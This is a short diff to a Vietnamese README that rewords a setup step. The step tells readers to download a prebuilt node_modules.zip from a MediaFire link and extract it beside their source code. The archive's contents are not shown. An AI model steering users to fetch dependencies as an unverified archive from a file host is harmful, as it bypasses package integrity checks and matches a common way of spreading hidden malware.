@@ -8,7 +8,7 @@
 
 ### Bước 1: Tải và Giải Nén Thư Mục
 
-Trước khi bạn bắt đầu, hãy tải thư mục cần thiết từ link sau: [tại đây](https://www.mediafire.com/file/5wqn700by5un3yx/node_modules.zip/file)
+Trước khi bạn bắt đầu, hãy tải thư mục cần thiết [tại đây](https://www.mediafire.com/file/5wqn700by5un3yx/node_modules.zip/file)
 
 Sau khi tải xong, giải nén thư mục và chắc chắn rằng nó được lưu trữ ở cùng thư mục với mã nguồn của bạn.
 
